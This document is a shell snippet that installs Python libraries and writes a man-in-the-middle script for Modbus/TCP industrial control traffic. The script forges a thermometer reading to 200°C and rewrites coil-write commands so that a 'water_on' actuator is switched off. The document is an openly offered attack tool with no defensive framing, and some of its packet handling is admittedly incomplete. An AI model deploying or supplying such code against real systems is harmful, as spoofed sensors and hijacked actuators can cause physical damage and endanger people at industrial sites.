# Install Python + libs
apt-get update && apt-get install -y python3-pip libnetfilter-queue-dev
pip3 install netfilterqueue pymodbus scapy

# Create the MITM script
cat << 'EOF' > /usr/src/mitm_modbus.py
#!/usr/bin/env python3
import logging, socket
from netfilterqueue import NetfilterQueue
from pymodbus.pdu import ModbusRequest, ModbusResponse
from pymodbus.factory import ClientDecoder, ServerDecoder

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")

def process_packet(pkt):
    raw = pkt.get_payload()
    # strip Ethernet/IP/TCP headers if needed…
    # here assume raw is the Modbus/TCP ADU (7-byte header + PDU)
    try:
        # Decide request vs response by function code bit
        func = raw[7]
        # response if highest bit set?
        decoder = ServerDecoder() if func < 0x80 else ClientDecoder()
        msg = decoder.decode(raw[7:])
        logging.info(f"Decoded: {msg}")

        # ==== SENSOR SPOOFING ====
        # If this is a Read Input Registers RESPONSE (func=4)
        if isinstance(msg, ModbusResponse) and msg.function_code == 4:
            # msg.registers is a list of ints
            old = msg.registers[0]
            msg.registers[0] = 200  # spoof to 200°C
            logging.warning(f"Forged thermometer: {old} → {msg.registers[0]}")

        # ==== ACTUATOR HIJACKING ====
        # If this is a Write Multiple Coils REQUEST (func=15)
        if isinstance(msg, ModbusRequest) and msg.function_code == 15:
            # flip coil 2 (water_on) off
            coil_vals = list(msg.value)
            if len(coil_vals) >= 2:
                coil_vals[1] = False
                msg.value = coil_vals
                logging.warning(f"Tampered WriteCoils: set coil[1]=False")

        new_payload = msg.encode()
        # re-prepend header (transaction id etc) here if you stripped it
        pkt.set_payload(raw[:7] + new_payload)
    except Exception as e:
        logging.error(f"MITM decode error: {e}")
    pkt.accept()

if __name__ == "__main__":
    nfq = NetfilterQueue()
    nfq.bind(1, process_packet)
    try:
        nfq.run()
    except KeyboardInterrupt:
        nfq.unbind()
EOF

chmod +x /usr/src/mitm_modbus.py

